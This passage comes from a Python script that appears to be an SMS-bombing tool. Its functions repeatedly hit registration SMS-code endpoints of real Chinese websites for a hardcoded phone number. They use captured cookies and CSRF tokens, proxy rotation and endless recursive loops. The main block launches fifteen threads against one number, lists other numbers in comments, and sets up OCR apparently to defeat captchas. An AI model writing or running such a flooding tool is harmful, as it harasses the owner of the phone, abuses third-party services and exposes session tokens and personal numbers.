            'Cookie': 'Hm_lvt_a0270aa2353f5a802fcc0a70e78884c8=1545848439; Hm_lpvt_a0270aa2353f5a802fcc0a70e78884c8=1545848439; UM_distinctid=167ebbf46c23ca-08d2456e6eadff-1e3f6654-fa000-167ebbf46c472a; _ga=GA1.2.343575510.1545848441; XSRF-TOKEN=eyJpdiI6InBERzlidXkwMFhpdklOa1U0Q05Oa0E9PSIsInZhbHVlIjoiUUdPZVQxelhhSUZNU2p1Nm1uWko2NE9nY200TmVXRng2TnhGalVIZGF4XC9TMHl2c0pqcHh4V3lXTWpMMFJ4bWp4NnY5MENXdzFKWDM0NDVsT0R1TEpRPT0iLCJtYWMiOiI0ZDEzZjJjYzNjZjY4ZjJmYmI1ZjY5MzNkZTdiYzdiZmM2OWUxZWQ4MTIwZTBjNzUzZjBmYjBjNjNkZjc5YzRjIn0%3D; laravel_session=eyJpdiI6Ijdqblh3eTZyTlgrVFYrSXBlVEQ5Vnc9PSIsInZhbHVlIjoiZExcL1wvSkZOeGtrZE1RMW1BT3Q4OTA3U1hhRlg5VXhIN2M4UEhCU3pcL0ZJNGw2NFk0MldocExnd2dGblRsS0dJemhFckcxTHk5dlNrQkRzRjZuQ2EwaWc9PSIsIm1hYyI6IjdlMGI3MjdmY2EzM2JlM2I0OWYxZWQ1MjdhNzcwYjJkOGRiZWYyYmIxZDMzNGMzN2M5NjcyYzRlMGQ3ZDBjYTYifQ%3D%3D',
            'Host': 'account.flnet.com',
            'Origin': 'https://account.flnet.com',
            'Referer': 'https://account.flnet.com/sso/register?redirect_url=https%3A%2F%2Fwww.flnet.com%2Findex.php%2Fopenapi%2Fsso%2Flogin%2F&bid=U1NPLTE3MDM4ODgwMDMtNXRxMzViYnBmNzBvdzg4c29zNG9rY3NnMC01OTUzMzc1ZWZiNzRmNzhmMjljYTJkZThlMDIxYjZhYjJkZmRkNTc0YWNmOGIzN2E5MDIyODk2ZGIzYzIzMWJi',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
            'X-CSRF-TOKEN': 'PmAjc8uWUZzMYGQhkmf5860R1lNY7zgaDMz7lPdQ',
            'X-Requested-With': 'XMLHttpRequest'
            }
        response = requests.post(url,data=data,headers=headers,proxies=proxies)
        print('【fun27】')
        print(response.text)
        time.sleep(step)
        fun27(step,phone,proxies)

def fun28(step,phone,proxies):#北京旅游集散中心@短信(http://www.bjlyjszx.com/register.jsp)
        timeStamp =int(time.time()*1000)
        url='http://www.bjlyjszx.com/JSON/sendSms.jsp?time=1546013764033&inputData=17740153798&act=register&p=%2BV%2BPcP1w6oakcY7xozrkegxaEvoNDJ3W0HQ1QOmTI3Y%3D'
        data={
            'time': str(timeStamp),
            'inputData': phone,
            'act': 'register',
            'p': '+V+PcP1w6oakcY7xozrkegxaEvoNDJ3W0HQ1QOmTI3Y='
            }
        headers={
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
            'Connection': 'keep-alive',
            'Cookie': 'JSESSIONID=5C0CAD3001E20D62E78C7B8882D85788; Hm_lvt_4f80f139d2ae3557005cbc8820a35c85=1546013752; register="http://bjlyjszx.com/register.jsp"; Hm_lpvt_4f80f139d2ae3557005cbc8820a35c85=1546013755',
            'Host': 'www.bjlyjszx.com',
            'Referer': 'http://www.bjlyjszx.com/register.jsp',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest'
            }
        response = requests.get(url,data=data,headers=headers,proxies=proxies)
        print('【fun28】')
        print(response.text)
        time.sleep(step)
        fun28(step,phone,proxies)
        
        
if __name__ == "__main__":
    path='/usr/local/Cellar/tesseract/4.0.0/bin/tesseract'
    pytesseract.pytesseract.tesseract_cmd = path
    phone='17740153798'
    #phone='13041244650'
    #phone='13861162252'
    sys.setrecursionlimit(10000)
    ImageFile.LOAD_TRUNCATED_IMAGES = True
    proxies = getProxies()
    print(len(proxies))
    
    t3=threading.Thread(target=fun3,args=(60,phone,proxies))
    t3.start()
    t12=threading.Thread(target=fun12,args=(60,phone,proxies))
    t12.start()
    t13=threading.Thread(target=fun13,args=(60,phone,proxies))
    t13.start()
    t14=threading.Thread(target=fun14,args=(60,phone,proxies))
    t14.start()
    t16=threading.Thread(target=fun16,args=(60,phone,proxies))
    t16.start()
    t17=threading.Thread(target=fun17,args=(60,phone,proxies))
    t17.start()
    t19=threading.Thread(target=fun19,args=(60,phone,proxies))
    t19.start()
    t21=threading.Thread(target=fun21,args=(60,phone,proxies))
    t21.start()
    t22=threading.Thread(target=fun22,args=(60,phone,proxies))
    t22.start()
    t23=threading.Thread(target=fun23,args=(60,phone,proxies))
    t23.start()
    t24=threading.Thread(target=fun24,args=(120,phone,proxies))
    t24.start()
    t25=threading.Thread(target=fun25,args=(60,phone,proxies))
    t25.start()
    t26=threading.Thread(target=fun26,args=(60,phone,proxies))
    t26.start()
    t27=threading.Thread(target=fun27,args=(60,phone,proxies))
    t27.start()
    t28=threading.Thread(target=fun28,args=(60,phone,proxies))
    t28.start()

    







'''
tesseract ~/dfm.tif ~/dfm -l eng --psm 7 batch.nochop makebox

tesseract ~/dfm.tif ~/dfm -l dfm --psm 7 batch.nochop makebox

//命令
tesseract ~/dfm.tif ~/dfm --psm 7 nobatch box.train

unicharset_extractor ~/dfm.box

echo 'font 0 0 0 0 0' > ~/font_properties

shapeclustering -F ~/font_properties -U ~/dfm.unicharset ~/dfm.tr

mftraining -F ~/font_properties -U ~/dfm.unicharset -O ~/dfm.unicharset ~/dfm.tr

cntraining ~/dfm.tr

combine_tessdata ~/dfm.





tesseract ~/Desktop/DongFangMiao/image/0.PNG result -l langyp.fontyp.exp0 --psm 7
 
    '''


